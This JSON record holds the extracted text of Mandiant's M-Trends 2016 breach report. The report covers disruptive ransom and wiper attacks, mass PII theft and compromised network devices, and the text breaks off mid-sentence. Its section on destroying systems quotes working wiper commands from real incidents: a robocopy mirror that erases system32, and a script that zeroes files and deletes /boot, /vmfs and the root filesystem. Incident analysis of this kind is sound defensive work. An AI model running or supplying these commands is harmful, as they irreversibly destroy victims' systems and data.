{
    "id": "5f274e06-8948-464a-ab76-8871f9405c0e",
    "created_at": "2022-10-25T16:48:18.137962Z",
    "updated_at": "2025-03-27T02:16:26.383463Z",
    "deleted_at": null,
    "sha1_hash": "06224e369906b48f6a86fe582304ef2df3d4436c",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-02-25T08:14:25Z",
    "file_modification_date": "2016-02-25T08:20:29Z",
    "file_size": 910680,
    "plain_text": "###### MANDIANT CONSULTING\n\n## M-TRENDS\n# 2016\n\n\n-----\n\n###### CONTENTS\n\n Executive Summary 3\n\n By the Numbers 6\n\n 2015 Trends Trend 1: David v. Goliath: 9\n The rise of business disruption attacks Trend 2: This Time it’s Personal 16 Trend 3: Attacks on Enterprise Networking Devices 19\n\n A Look Back, Trends Turned Constants Outsourced Service Provider Abuse 22 Windows Persistence 28\n\n The [re]Rise of Red Teaming 36\n\n FaaS – Real-Time Adversary Detection and Response at Scale 44\n\n Conclusion 47\n\n\n-----\n\n###### EXECUTIVE SUMMARY\n\n MANDIANT RESPONDED TO A LARGE NUMBER OF HIGH PROFILE BREACHES IN 2015, JUST AS WE HAVE EVERY YEAR. WE NOTICED TWO MAIN DIFFERENCES IN THE RESPONSES WE PERFORMED IN 2015:\n\n 1. More breaches became public than at any other\n time in the past (both voluntarily and involuntarily), and\n\n 2.The location and motives of the attackers were\n more diverse.\n\n\n###### EXECUTIVE SUMMARY\n\n\n-----\n\n###### In 2015, more breaches than ever before became public knowledge. Suffice it to say that the security industry is changing because of new pressures being applied to these victim organizations. They now have to respond to the court of public opinion, as well as all other statutes, regulations, and lawsuits that come with a breach. In some  of our incident responses, we saw companies take actions based on external pressure that impacted their ability to fully scope and successfully remediate the breach.\n\nIn 2015, the nature of the breaches we\nresponded to continued to shift to a more\neven balance of Chinese and non-Chinesebased threat actors. We responded to more\nactors based out of Russia (both nationally\nsponsored and traditionally financially\nmotivated attack groups) than in the past.\nWe also saw an uptick in “gunslinger” (forprofit) groups. Finally, we noticed a significant\nincrease in attack groups leveraging\nderegulated currency (such as Bitcoin) to\nget their ransoms paid. (See the section\non business disruptive attacks for more\ninformation on this).\n\nIn this issue, we present our popular annual\nbreach statistics, discuss three new trends\nthat we have noticed, explore more in depth\n“Trends Turned Constants”, and include\ntwo additional articles to help support our\ninterpretation of the numbers we present.\nThe articles address the [re]Rise of Red\nTeaming operations, and how our FireEye\nas a Service (FaaS) service line is keeping\ncompanies safer and reducing the standard\nnumber of days compromised.\n\nNumbers always tell a story, but it’s the\ninterpretation of those numbers that holds\nthe real value. The median number of days an\norganization was compromised in 2015 before\nthe organization discovered the breach (or\nwas notified about the breach) was 146. This\ncontinues a positive improvement since we first\n\n\nOur clients’ privacy is\nof utmost importance\nto us. Thus, as in all\nM-Trends reports, we\nrefrain from naming our\nclients in this report,\neven if they have\nchosen to publicly\ncomment that they are\nworking with Mandiant.\n\nmeasured 416 days in 2012. Additionally, the\nmedian number was 205 days in 2014, which\nmeans we witnessed a drop of more than 50\ndays in 2015! Obviously, as an industry, we are\ngetting better at detecting breaches.\n\nEven so, it’s clear that we have a long way\nto go. Mandiant’s Red Team, on average, is\nable to obtain access to domain administrator\ncredentials within three days of gaining\ninitial access to an environment. Once\ndomain administrator credentials are stolen,\nit’s only a matter of time before an attacker\nis able to locate and gain access to the\ndesired information. This means that, in\nour experience, 146 days is at least 143 days\ntoo long. On a positive note, companies\nthat detected the breach on their own had\na median number of 56 days compromised.\nThe takeaway is that we are getting better as\nan industry, but there is still work left to do!\n\nMandiant recognizes that our median\nnumber of days compromised is a skewed\nstatistic, and has always been. This statistic is\ngenerated based on Mandiant’s experience\nresponding to breaches. Organizations that\nquickly detected a breach on their own,\nor resolved the breach without Mandiant’s\ninvolvement, are not included in the median\nnumber of days compromised. Nevertheless,\nwe think this metric’s trend over the years—if\nnot the numbers themselves—is a useful way\nto measure progress in our industry.\n\n\n-----\n\nThe most interesting new trend in 2015 was an\nincrease in the number of disruptive attacks\nwe responded to. Disruptive attacks can be\nthose that hold data for ransom (such as\nCryptoLocker), hold a company for ransom\n(stealing data and threatening to release it),\ndelete data or damage systems, add malicious\ncode to a source code repository, or modify\ncritical business data in the hope that it does\nnot get discovered.\n\nThe second new trend we explore is the bulk\nexport of Personally Identifiable Information\n(PII) from targeted companies by Chinese\nthreat actors. Previously, we had seen\ntargeted theft of PII information, but not the\nmass theft that we saw in 2015.\n\nThe third new trend we encountered is the\ndesire to exploit networking gear during a\ntargeted and persistent campaign. We’ve\nseen attackers compromise these devices in\norder to maintain persistent access, to change\nsecurity security access control lists (ACLs)\nto grant access to a protected environment,\nfor reconnaissance purposes, and for network\ntraffic disruption.\n\nThe two trends that we see year after year,\nwhich we termed “Trends Turned Constants”,\ndeal with persistence and the exploitation\nof third parties to gain access to a victim\n\n\norganization. Persistence is a topic we expect\nto continue see year after year, because\npersistence mechanisms are required for\nan attacker to maintain long-term access\nto an environment. We explored some\nnew and creative persistence mechanisms\nthat we discovered. Leveraging third-party\nservice providers to gain access to a victim\norganization is a favored technique to gain\ninitial access because often the service\nprovider’s security posture is less than that\nof the victim organization. In addition, service\nproviders are often trusted entities, thus\ngranting the attacker easy and trusted access\nto their intended target.\n\nAll of the trends we’re seeing lead to one\nconclusion: It is more critical to focus on all\naspects of your security posture (people,\nprocesses, and technology) than ever before.\nThe information presented in this year’s\nM-Trends should help provide justification for\nthe renewed focus.\n\n\n-----\n\n## BY THE NUMBERS\n\nMandiant Industries Targeted\n\nEnergy 1%\n\nAgriculture and Forestry 1%\n\nHigh Tech 13%\n\nTelecommunications 2%\n\nGovernment and International\nOrganizations 3%\n\nLegal Services 3%\n\nTransportation 3%\n\nAerospace and Defense 5%\n\nHealthcare 5%\n\n\n-----\n\nHow Compromises Are Being Detected\n\n###### 53%\n\n\nMedian Time of Compromise to Discovery\n\nAll Mandiant Investigations in 2015 External Notification Internal Discovery\n##### 146 days 320 days 56 days\n\n|All Mandiant Investigations in 2015|External Notification|Internal Discovery|\n|---|---|---|\n|146 days|320 days|56 days|\n\n\nDay of Week of Spearphishing Frequency\n\n|DAY|SUM OF PERCENTAGE|\n|---|---|\n|Sunday|0%|\n|Monday|11%|\n|Tuesday|11%|\n|Wednesday|29%|\n|Thursday|20%|\n|Friday|18%|\n|Saturday|10%|\n\n|Col1|Saturday Friday Thursday Wednesday Tuesday Monday Sunday|Col3|Col4|Col5|Col6|Col7|Col8|Col9|\n|---|---|---|---|---|---|---|---|---|\n\n\n0%\n\n\n5% 10% 15% 20% 25% 30% 35%\n\nPercentage of total spear phishing emails\n\n\n-----\n\n###### FAAS METRICS FOR 2015\n\n#### 100s 6 2.8M\n\n\n###### Hundreds of clients Six global Security Network visibility for in dozens of industry Operations Centers more than 4 million verticals. providing constant hosts with full endpoint\n\n\n-----\n\n## 2015 TRENDS\n\n\n###### TREND 1\n\n DAVID V. GOLIATH THE RISE OF BUSINESS DISRUPTION ATTACKS\n\n Over the past year, Mandiant responded to incidents where attackers destroyed critical business systems, leaked confidential data, held companies for ransom, and taunted executives. Some attackers were motivated by money, some claimed to be retaliating for political purposes, and others simply wanted to cause embarrassment.\n\n\nThe idea of a cyber-attack that\nis intended to disrupt business\noperations is no longer a farfetched\nscenario. This past year has shown\ndisruptive attacks have a real effect\non organizations large and small.\nSome of these attacks were purposely\ncarried out in public, and involved\nleaking data or broadcasting ransom\ndemands in an attempt to embarrass\nor damage the victims in some way.\nConversely, we have seen cases where\nthe attackers tried to remain private.\nThese instances often involved a\nmonetary ransom demand to prevent\nthe release of stolen data.\n\nThis past year we saw an increasing\nnumber of what can be considered\n“disruptive” attacks. While almost all\nsuccessful attacks are disruptive on\nsome level, these attacks were meant\nto bring attention to the attack or to\n\n\nthe attacker’s cause. This is opposed\nto the traditional “low and slow”\ntechniques typically employed to\nmaintain access on corporate networks\nand steal data without being detected.\n\nThese attacks resulted in a public\nrelease of confidential data and,\nconsequently, embarrassment and\nreputational damage. In some cases,\ncompanies lost the capability to\nfunction as a business due to the\ncrippling loss of critical systems.\nSide effects included executive\nresignations, costly ransoms, and\nexpensive system rebuilds.\n\nTraditional targeted attacks are\ncarried out over time, with the\nattacker usually taking steps to hide\ntheir malicious activity and remain\nundetected in the victim environment.\nThis is true regardless of what is\n\n\nbeing targeted, be it trade secrets,\nintellectual property, customer records,\npayment information, or other sensitive\ndata. With disruptive attacks, the\nattackers take steps to draw attention\nto their malicious activity or the\ninformation they have stolen.\n\nDisruptive attacks are likely to\nbecome an increasing trend given the\nhigh impact and low cost. Disruptive\ncyber capabilities are sometimes\nreferred to as “asymmetric,” in that\nthey can cause a significant and\ndisproportionate amount of damage\nwithout requiring attackers to possess\nlarge amounts of resources or\ntechnical sophistication.\n\nWe have outlined four disruptive\nscenarios that our clients have\nexperienced over the last year.\n\n\n-----\n\nBeing held for ransom\n\nOver the past year, we’ve assisted an\nincreasing number of clients in dealing\nwith digital blackmail schemes.\nThese typically involved attackers\nthreatening to publicly release stolen\ndata unless the demand for large\npayments from the victim was met.\nThe ransom demand often came in\nthe form of a decentralized digital\ncurrency such as Bitcoin.\n\nIn all cases we worked, with one\nnotable exception, the value of the\nransom demand was commensurate\nwith the value of the stolen data.\nThis helped ensure that companies\nwould pay the ransom. If the ransom\namount is too large, the attacker is\nlikely to never be paid. In one notable\nexception, the ransom demand was\ninexplicably low, despite the attacker\nseeming to know the true value of the\nstolen data. This instance came under\nscrutiny by the victim company and\nlaw enforcement because an ulterior\nmotive was suspected.\n\nMost of the ransom cases we\nresponded to followed a common\napproach. The attacker sent an email\nto a company executive indicating\n\n\nthat some amount of sensitive data\nwas stolen and will be released\npublicly on a certain date unless a\nransom payment is made.\n\nIn these cases, the deadline never\nallowed enough time for a proper\ninvestigation to be conducted. Rather,\nwe focused on trying to determine\nwhether the attacker’s claims were\ncredible or not. In some cases we\nwere able to prove that data loss\nactually occurred, and in other cases\nwe were not able to prove data loss\nbefore the deadline.\n\nThe obvious next question is whether\nor not a victim organization should\npay the ransom. Each scenario is\nunique and needs to be approached\ndifferently. As such, there is no direct\nanswer we can provide. Even if a\nvictim organization pays the ransom,\nthere is always a chance the attacker\nwill release the data anyway.\n\nIn one case, an individual claimed to\nhave access to thousands of customer\nrecords from one of our clients.\nThe individual provided personal\ninformation for a few customers as\nproof, and threatened to publish the\nrest of the stolen data if a ransom\n\n\nwas not paid. Throughout the\ninvestigation, the individual allowed\nmultiple ransom deadlines to slip.\nWe suspected that an employee may\nhave been involved, so we analyzed\nthat employee’s system and found\nevidence that suggested involvement.\nThe company and law enforcement\ninterviewed the employee, and the\nstaffer confessed that they were\nbehind the ransom attempt. The\nemployee was fired, the ransom was\nnot paid, and no customer data was\npublicly released.\n\nAlthough not typically the result\nof targeted intrusions, we would\nbe remiss if we didn’t mention\ncommodity ransomware such as\nCryptoLocker, which has impacted\ntens of thousands of organizations\nand individuals. Mandiant has received\nhundreds of calls from organizations\nand individuals whose files were\nencrypted with numerous ransomware\nvariants. These ransomware\nthreats demonstrate the significant\nmaterial impact that can occur in an\nautomated, non-targeted manner.\n\n\n-----\n\nDestroying critical systems\n\nWe’ve investigated multiple incidents where attackers\nwiped critical business systems and, in some cases, forced\ncompanies to rely on paper and telephone-based processes\nfor days or weeks as they recovered their systems and\ndata. We have even seen attackers wipe system backup\ninfrastructure in an effort to keep victims offline longer.\n\nMost threat actors that we investigated over the years\nhad the system-level privileges and access to destroy our\nclients’ technology environments and shut down business\n\n\noperations, but instead, they covertly stole credit card data,\npersonal information, and intellectual property.\n\nOther threat actors are motivated to overtly disrupt business\noperations and cause embarrassment to their victims. The\nsophistication and capabilities of disruptive threat actors\nranges from possible amateurs to suspected nation states.\nHere are some examples of the system wiping techniques\nthat we’ve observed being used by attackers.\n\n|Example 1:|An attacker created a scheduled task that deleted the Windows directory using the Microsoft robocopy tool on critical systems within the environment. The script first created a new directory called c:\\emptydir that had no files. Next, the script executed robocopy with command line switches to mirror the directory tree from c:\\emptydir to c:\\windows\\system32. Since there were no files or directories in c:\\emptydir, the contents in c:\\windows\\system32 were erased. In parallel with the robocopy execution, the script executed the shutdown command that powered the system off after 30 minutes (1,800 seconds). When an administrator powered the impacted systems back on, Windows failed to boot up. The scheduled task is shown below.|\n|---|---|\n\n\nmkdir “C:\\emptydir”\nrobocopy “C:\\emptydir” “C:\\windows\\system32” /MIR | shutdown /s /t 1800\n\n|Example 2:|An attacker with domain administrator-level access to a victim’s Active Directory environment attempted to distribute ransomware through scheduled tasks and Group Policy objects (GPOs). The attacker created a scheduled task and pushed it onto the target systems via GPOs. The scheduled task loaded a malicious script from the domain controller (DC). The script then copied over an executable from the DC to the target systems and executed it. The executable was designed to encrypt user files (documents, photos, emails, backups, etc.) on the file system and instruct the victim to visit a website that contained instructions to obtain the decryption key.|\n|---|---|\n\n\n-----\n\n|Example 3:|An attacker created multiple variants of malware designed to wipe Windows systems based on the function of the system, and then automatically spread to other systems in the network. For the Domain Controller version, the malware delayed destruction for a period of time so that the server could continue to provide Windows authentication services, allowing the malware to spread more comprehensively.|\n|---|---|\n\n\nSome other key differences of the malware versions included:\n\n1. Workstation – killed the antivirus process and wrote a custom MBR to the disk.\n2. Server – disabled terminal services.\n3. Mail Server – stopped the mail service and disabled terminal services.\n4. Domain Controllers - disabled terminal services and executed the wiper code after a\nperiod of time to allow the malware to continue spreading.\n\n|Example 4:|An attacker created a wiping script that differed for each Linux or Mac system in the environment. For example, the script extract shown below was designed to be executed on ESX servers to disable the server itself and render any virtual machines running on the server inaccessible. The script looked for large files and wrote zeros partially into the files. The script then attempted to delete system files.|\n|---|---|\n\n\nfind / -type f -name “*.*” | grep -v “disks” | grep -v “\\/dev” | awk ‘{print “ls\n-l \\”” $0 “\\”” }’ |sh | awk ‘{if ($5>524288000) print “dd if=/dev/zero of=\\”” $9\n“\\” bs=512k count=400 seek=400 conv=notrunc,noerror > /dev/null 2>&1 &”}’ | sh\nsleep 1\nrm -r -f /boot/* &\nrm -r -f /vmfs/* &\nrm -r -f /* &\nrm -f /bin/* /sbin/* &\nexit\n\n\nThe script above can be interpreted as:\n\n1. Search the entire filesystem for any filename that matches the regex *.*, does not have the\nword “disks” in it, and does not have “/dev” in the path.\n2. Checks if the file is greater than 524mb.\n3. If file is greater, then seek 400 512kb blocks into the file and write 200mb of zeros.\n4. Delete everything in /boot.\n5. Delete all volumes under /vmfs.\n6. Begin removing everything on the filesystem.\n7. Remove important binaries from /sbin and /bin.\n\n\n-----\n\nPublishing sensitive company data on\nthe Internet\n\nWe have worked with a number of\nclients whose sensitive company\ndata was published on the Internet. In\nsome cases, this was done because\na ransom demand had not been met.\nIn other cases, it was done simply to\nembarrass the organization.\n\nThreat actors commonly leverage\npopular sharing platforms such as\nPastebin[1] to publish their “manifesto.”\nThey may dump sensitive corporate\ninformation such as company emails,\nemployee information, compromised\ncredentials, and database dumps\ndirectly on the site, or include links\nto download the data from other file\nsharing sites.\n\nThreat actors may also leverage\nphoto-sharing websites to publish\nscreen captures, thus proving\nthey had access to our client’s\nenvironment. These sites have\nformal abuse reporting processes\nand many of our clients have been\n\n\nable to get unauthorized content\ntaken down quickly. Knowing that\nreputable content sharing sites take\ndown content quickly, threat actors\nwill also use other platforms such\nas ThePirateBay, other BitTorrent\ntrackers and peer-to-peer websites.\n\nThreat actors also sometimes reach\nout to the media in an attempt to\nincrease public visibility and maximize\nthe victim’s embarrassment before the\ncontent is taken down.\n\nAttempting to deceive\n\nDespite the bold nature of disruptive\nthreat actors, they actually don’t want\ntheir true identity to be known out of\nfear of retribution or criminal charges.\n\nIn one case, a threat actor\nindicated he was from Russia and\ncommunicated in the Russian\nlanguage. Our linguists analyzed the\nquality of the language in multiple\ncommunications with the attacker. We\nassessed the quality of the language\nto be poor since there were instances\n\n\nof literal translations of English\ntechnical terms to Russian that would\nbe obvious to a Russian speaker. The\npoor translation and other technical\nevidence observed during the\ninvestigation led us to believe that\nit was likely the threat actor used\nlanguage translation software when\ncommunicating in Russian.\n\nAnother case involved an attacker\nwho claimed to be unable to speak\nthe English language, but it soon\nbecame apparent that the actor\nwas an educated English speaker.\nThe attacker had initially been\ncommunicating through some type\nof automatic translation software, but\nthey ended up switching to natural\nEnglish at times when convenient.\n\n\n1 Pastebin is a public text sharing platform which does not require any form of registration before publishing.\n\n\n-----\n\n**Lessons learned from investigating disruptive breaches**\n\nResponding to disruptive breaches is challenging, and the time the attacker contacts the victim organization.\nnot easy to plan for given the dynamic nature of these Therefore, a different response to these incidents is\nattacks and the attackers. Unlike breaches where a required. We’ve outlined ten lessons from our incident\ncontainment plan may be able to stop an attacker response engagements that may help organizations\nfrom stealing more information, in these disruptive deal with disruptive attacks:\ninstances the damage may have already been done by\n\n### 1 2 3 4 5\n\n**CONFIRM THERE** **REMEMBER THAT** **TIMING IS CRITICAL –** **STAY FOCUSED –** It’s **CAREFULLY**\n**IS ACTUALLY A** **YOU’RE DEALING** You need to validate easy to get distracted. **EVALUATE WHETHER**\n**BREACH –** Just because **WITH A HUMAN** and scope the breach Evaluate whether the **TO ENGAGE THE**\nsomeone claimed they **ADVERSARY –** Humans as quickly as possible. tasks you are taking **ATTACKER –** Attackers\nhacked you doesn’t can be unpredictable This may require the on will help mitigate, do not always expect\nnecessarily make it and they may react out team working nights detect, respond, or a response. Some will\ntrue. Empty extortion of emotion. Carefully and weekends, so be contain the attack. move on if they did\nattempts are not consider how the careful of fatigue and Remember that you’re not specifically target\nuncommon. Examine adversary will react to burnout. You may need racing against the your organization\nyour environment your action or inaction. to approve emergency clock. Focus on the (consider situations\nfor evidence of They can become change requests within must-haves instead of where an attacker\ncompromise before more aggressive if they short order. the nice-to-haves, and exploited a vulnerability\npaying the ransom. If get upset. They may understand that you across hundreds of\nthe attacker provided back down and allow may need to deploy a organizations). Other\ndata as proof, confirm for more time if they number of temporary attackers may get\nthat the data is real and believe you are trying to solutions to address the agitated due to the\ndetermine if it came meet their demands. attack. lack of response. If you\nfrom your environment. decide to respond,\n\nlimit the interactions\nand carefully consider\neverything you say.\nConsider involving\nlaw enforcement and\nlegal counsel in all\ncommunications.\n\n\n-----\n\n### 6 7 8 9 10\n\n**ENGAGE THE** **CONSIDER ALL** **ENSURE STRONG** **AFTER THE INCIDENT** **IF YOU KICK THEM**\n**EXPERTS BEFORE** **OPTIONS WHEN** **SEGMENTATION AND** **HAS BEEN HANDLED,** **OUT, THEY MAY**\n**A BREACH –** You will **ASKED TO PAY A** **CONTROLS OVER** **IMMEDIATELY** **TRY TO COME BACK**\nneed forensic, legal, **RANSOM – Understand** **YOUR BACKUPS –** Most **FOCUS ON** **IN A DIFFERENT**\nand public relations that paying the ransom organizations have **BROADER SECURITY** **WAY –** Don’t forget\nsupport to get through may be the right option mature backup policies **IMPROVEMENTS –** to operationalize\na disruptive breach. in some scenarios, but so they can recover Regardless of the and enhance the\nIdentify partners before there are no guarantees quickly in the event of a outcome, you should temporary solutions\nthe breach and get the attackers won’t system failure. However, ensure that the attacker that were deployed to\nthem on retainer. come back for more it’s common for the cannot come back in immediately address\n\nmoney or simply leak systems containing and do more damage. the attack. Conduct\nthe data anyway. backups to be part of You also don’t want penetration testing and\nInclude experts in the same environment a second attacker Red Team assessments\nthe decision-making compromised by the targeting you because to validate your security\nprocess and understand attacker. Tighten they think you are controls, identify\nthe risks associated with access to your backup willing to pay a ransom. vulnerabilities, and fix\nall options. environment to mitigate Ensure you understand them immediately.\n\nthe risk of an attacker the full extent of the\naccessing the system breach and implement\nusing compromised both tactical and\ncredentials and strategic actions to\ndestroying your prevent future attackers\nbackups. from gaining access.\n\n**Conclusion**\n\nover the last few years have altered the notion\n\nDisruptive attacks were once considered an of what comprises a worst-case scenario. As\nimplausible worst-case scenario for many we’ve seen over the past year, disruptive attacks\ncompanies and were typically not planned for have become a legitimate issue and businesses\nby executives. Put simply, no one previously will have to begin planning and preparing\nexpected to have half the workforce lose accordingly. The best-case scenario when\naccess to their computers within a short experiencing a disruptive attack is that you are\namount of time. However, public events well prepared and able to minimize the damage.\n\n\n-----\n\n###### TREND 2\n\n THIS TIME IT’S PERSONAL\n\n Over the past year, Mandiant responded to several targeted attacks that resulted in the theft of Personally Identifiable Information (PII) by threat actors linked to China. In these cases, the volume of PII stolen indicated that the objective was the mass collection of PII data, not just that of specific individuals.\n\n\nIn our years of responding to incidents\ninvolving China-based threat actors, Mandiant\nhad not observed a trend of indiscriminate\ntheft of PII; however, we were aware of one-off\ninstances of PII theft occurring as a byproduct\nof larger data theft operations (for example,\nstealing all data on a file server, including PII\nthat may not have been of particular interest\nto the attacker).\n\nOur view changed last year as we investigated\nseveral massive PII breaches that we believe\nwere orchestrated by threat actors operating\nin China.\n\n\nThe breaches we investigated spanned\nmultiple sectors, including healthcare, travel,\nfinancial services, and government. While\nwe initially suspected the threat actors\nwould target health records and credit card\ninformation, we found no evidence. Instead,\nwe observed the threat actors target and\nsteal information that could be used to\nverify identities such as Social Security\nnumbers, mothers’ maiden names, birthdates,\nemployment history, and challenge/response\nquestions and answers.\n\n\n-----\n\n###### CASE STUDY\n\n Examining how a China-based threat actor stole vast amounts of PII.\n\nPhishing attacks continue to be a theme The threat actor demonstrated an\nyear after year, and this case is no different. understanding of database systems from\nIt began with a threat actor successfully Microsoft, Teradata, and Oracle, as well as the\nenticing a user to follow a malicious link transaction gateways used to access these\nin a phishing email. The link downloaded a systems. With the database information in\nbackdoor, providing the threat actor access hand, the threat actor systematically tested\nto the victim’s environment. Once the threat authentication and inventoried databases.\nactor obtained a foothold, the reconnaissance The threat actor then searched the database\nactivity was primarily centered on the tables for column names that indicated they\nidentification of databases with the greatest contained sensitive information, such as Social\nvolume of PII. Security numbers.\n\nThe threat actor gained access to the Once the threat actor found the information\ndatabases by leveraging the victim’s Active of interest, specific fields for every record in\nDirectory information to identify database the targeted databases were extracted. The\nadministrators and their computers. information included Social Security numbers,\nSpecifically, the attacker searched Active mothers’ maiden names, and dates of birth.\nDirectory group membership for the Due to the volume of information extracted,\nkeyword “database.” The threat actor moved the threat actor would:\nlaterally to those systems and harvested\n\n1. Extract information in chunks\n\ndocumentation in an attempt to identify the\n\n(100,000 to 1,000,000 records at a time).\n\nnames of databases, database servers, and\n\n2. Compress the information into\n\ndatabase credentials.\n\nsplit archives.\n\n                                     - Upload the compressed files containing\nPII to file sharing sites.\n\nCOMPROMISED\n\nSYSTEM\n\n1. The threat actor queries database to\n\nidentify columns with PII.\n\n2. After identifying PII, the attacker breaks\n\nup the queries into manageable chunks.\n\n3. The threat actor compresses and\n\nuploads the harvested PII data to\npublically available file sharing sites.\n\n\n-----\n\nPotential Motivations for Targeting PII\n\nThe targeting of PII by China-based threat\nactors raised questions, specifically as to how\na country could benefit from this information.\nThis was especially true for threat actors who\nhad historically targeted information related\nto research and development or mergers\nand acquisitions. While Mandiant has not yet\nseen how these threat actors are leveraging\nthe stolen PII, potential motivations of\nChina-based threat actors could include the\nfollowing:\n\nBypassing Identify Verification and Access\nManagement Schemes\nGiven the type of PII the attacker stole,\nthreat actors could circumvent user identify\nverification and management processes. We\ncommonly see threat actors use legitimate\nuser accounts that already exist in the\nenvironment. Access to this type of PII could\nallow a threat actor to successfully navigate\nknowledge-based security mechanisms\n(knowing the correct response to personal\nquestions only the employee is assumed to\nknow) and compromise existing accounts.\n\nFacilitating “Traditional” Espionage\nOperations & Identifying and Recruiting\nInsider Threats and Subject Matter Experts\nA government may target PII to assist in the\nrecruitment of human intelligence assets.\nKnowledge of an individual’s financial situation,\nideology, and susceptibility to blackmail\ncould increase the success of a government’s\nrecruiting efforts.\n\nTargeting Specific Populations\nAccess to vast amounts of PII may assist a\ngovernment in identifying and monitoring\npersons of interest to the government. We\nhave previously observed China-based\nthreat actors target dissidents, minorities,\nforeign journalists, nonprofit employees, and\nother individuals considered a threat to the\nCommunist Party’s image and legitimacy.\n\n\nMitigate and Detect Targeted Threats\nthrough Enhanced Security Controls\n\nCombating targeted threats requires executive\nsupport, effective policies and procedures, and\npreventative and detective security controls.\nWhen implemented correctly, a defensein-depth approach provides organizations\nwith the ability to reduce risks to its sensitive\ninformation – PII, in this case. The following\ncontrols were identified as a common thread\nfor organizations that suffered PII breaches:\n\nLocate critical information\nTo make decisions about encryption, network\nsegmentation, and user rights restrictions\n(all at the core of computer security),\norganizations must first know where critical\ninformation resides in their environment.\n\nEncrypt sensitive information stored in\ndatabases\nConsider implementing both transparent\ndatabase encryption (TDE) and application\nlayer encryption for databases storing\nsensitive information.\n\nRestrict network access to database servers\nImplement network Access Control Lists\n(ACLs) to limit access to database servers.\nOnly systems on trusted and well monitored\nnetwork segments should be permitted to\nestablish connections directly to database\nservers.\n\nConclusion\n\nMandiant continues to monitor targeted threat\nactors and track their evolution to include the\nprogression of the data being targeting. We\nexpect China-based threat actors will continue\ntargeting and steal PII from organizations.\nWhile the specifics on motivations are still\nemerging, it is reasonable to assume the trend\nwill continue and PII will be at risk.\n\n\n-----\n\n###### TREND 3\n\n ATTACKS ON ENTERPRISE NETWORKING DEVICES\n\n Over the past several years, Mandiant has observed advanced threat actors compromise networking device infrastructure such as a routers, switches, and firewalls. These devices are critical components of enterprise infrastructures and are often overlooked by incident responders during an investigation, especially when they have identified other backdoors or means of remote access used by the threat actors.\n\n\nWhy attackers target networking devices\n\nThere are numerous reasons why a threat actor would\ntarget network infrastructure, given the critical role these\ndevices play in a network. Some examples are:\n\n- Traffic Monitoring: Network devices may offer an\nopportunity to monitor traffic within and across\nnetwork segments. This may allow access to data from\nnumerous computers that would otherwise require\nthreat actors to compromise multiple individual hosts.\n\n- Reconnaissance: Similar to traffic monitoring, threat\nactors could use router and firewall access to collect\ninformation for further system/network targeting\nand lateral movement. This could range from\ndumping existing reconnaissance data (e.g. routing\ntables and similar) or active data collection to map\nthe network and devices, authentication and other\ncritical systems, etc.\n\n\n\n- Subversion of Security Controls: Threat actors could\nmodify or disable security controls of networking\ndevices. Examples of these security control\nsubversions include opening routes or modifying ACLs\nor firewall rules to allow traffic for command and\ncontrol or interactive accesses. Threat actors can also\nmodify or subvert secure tunnels or segmentation,\nreroute traffic for monitoring, or modify sessions to\nman-in-the-middle communications.\n\n- Persistence: Threat actors might install a backdoor\ndirectly on the networking device that gives them\ndirect access to the network.\n\n- Disruption: Threat actors could modify or disable\nfeatures on the network devices to disrupt\ncommunications on the device and cause a denial\nof service.\n\n\n-----\n\nNetworking devices are challenging to\ninvestigate due in part to a lack of tools that\ncan either detect a compromise or facilitate\na forensic review. During an intrusion, manual\nanalysis of these devices is time-consuming\nand inefficient. Furthermore, most enterprise\nnetworks have dozens or hundreds of these\ndevices, each with complex rule sets and\nvarying software versions. This makes analysis\nat scale extremely difficult.\n\nInvestigation of networking devices is often\nalso not a priority when an attacker has access\nto sensitive data in an environment. While the\nlevel of sophistication needed to compromise\nthese devices is often high, attackers know\nthat if they are successful, their attack will be\ndifficult to detect.\n\nExamples of Attacks on Networking Devices\n\nThe following are examples of attacks against\nnetworking infrastructure that Mandiant has\nobserved over the past few years:\n\nModification of Cisco Router Images\n\nMandiant observed threat actor compromise\na telecommunications company. During the\nintrusion, the threat actor discovered on an\ninternal network file share a repository of the\nvarious Cisco router images the company used\nfor its routers. The threat actor transferred\nthese images out of the environment, modified\nthem to include a backdoor, and then replaced\nthe legitimate images on the file share with\nthe malicious images. The threat actor then\nused anti-forensics techniques to modify\nthe timestamps of the malicious images in\nthe repository so that they matched the\ntimestamps of the legitimate images.\n\nMandiant discovered that multiple routers in\nthe environment were running the malicious\nimage and, importantly, that the activity had\noccurred more than half a year prior to the\ninvestigation. There was not enough forensic\nevidence to determine whether it was the\nthreat actor or systems administrators who\nhad installed the malicious image on the\n\n\ndevices, but it is possible the attacker chose\nto be as stealthy as possible by waiting for an\nadministrator to accidentally install one of the\nmaliciously modified images – rather than do\nit themselves.\n\nCross-Site Scripting a Cisco ASA VPN\nConcentrator\n\nA threat actor used a pre-authentication\ncross-site scripting (XSS) attack against Cisco\nASA VPN devices, a vulnerability identified as\nCVE-2014-3393. The threat actor exploited this\nvulnerability to append malicious JavaScript\nto the company’s logo on the SSL VPN landing\npage. This malicious script silently captured\ncredentials of users that used a web browser\nto initiate their SSL VPN session and posted\nthem to a site controlled by the threat actor.\nThe organization did not require a second\nfactor for authentication to the VPN, so the\nthreat actor was able to use credentials\nharvested by the malicious script to log into\nthe corporate network using the VPN.\n\nDuring our testing to understand the severity of\nthis issue, we discovered that this attack could\nbe performed even if two-factor authentication\nwas required on the Cisco ASA device. We\nwere able to harvest session information, as\nwell as legitimate credentials, which allowed us\nto perform a traffic replay attack.\n\nCisco IOS Router Backdoors: SYNFUL Knock\n\nIn 2015, Mandiant released a report detailing\nthe modification of network border routers\nrunning Cisco IOS with an implant named\n[SYNful Knock. The implant consists of a](http://https://www2.fireeye.com/rs/848-DID-242/images/rpt-synful-knock.pdf)\nmodified Cisco IOS image that permits\nthe threat actor to load modules to the\nrouter containing new functionality directly\nfrom the Internet. The modification of the\nrouter images discovered by Mandiant was\npersistent even after a reboot and allowed\na threat actor to log into the compromised\ndevices from the Internet.\n\n\n-----\n\nMandiant confirmed the existence of 14\nSYNful Knock router implants on Internetfacing infrastructure in four different\ncountries: Ukraine, Philippines, Mexico, and\nIndia. Further research by others found that\nmany more routers had been compromised\naround the world.\n\nTactical Recommendations\n\nAs with other systems in an environment,\nintegrity monitoring and authentication\nmanagement are critical in preventing or\ndetecting an attack on networking devices.\nMandiant recommends the following actions\nto aid organizations in preventing, detecting,\nand recovering from an intrusion involving the\ncompromise of networking devices:\n\n- Strong Authentication: Enforce multifactor authentication for administrative\naccess to the networking devices. Use a\nsystem that relies on hardware tokens,\nSMS, or a smartphone application rather\nthan a workstation-based “softoken”\nsolution.\n\n- System Integrity 